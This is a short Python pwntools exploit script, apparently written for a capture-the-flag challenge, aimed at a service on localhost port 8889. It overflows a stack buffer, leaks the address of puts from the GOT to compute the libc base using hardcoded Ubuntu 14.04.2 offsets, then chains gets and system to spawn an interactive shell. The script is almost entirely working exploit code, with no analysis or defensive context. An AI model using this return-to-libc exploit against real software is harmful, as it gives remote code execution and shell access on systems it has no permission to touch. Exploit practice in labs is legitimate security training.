#!/usr/bin/env python

from pwn import *

r = remote('127.0.0.1', 8889)

main = 0x804858d
puts_plt = 0x08048420
puts_got = 0x0804a018

puts_off = 0x65650     # Ubuntu 14.04.2 /lib/i386-linux-gnu/libc.so.6
system_off = 0x40190
gets_off = 0x64cd0

r.send('A'*116 +
    p32(puts_plt) + p32(main) + p32(puts_got) + '\n')

recv = r.recvline()
print recv
base = u32(recv[:4]) - puts_off

print 'libc base =', hex(base)

system = base + system_off
gets = base + gets_off

r.send('A'*124 +
    p32(gets) + p32(system) + p32(puts_got) + p32(puts_got) + '\n')

r.interactive()
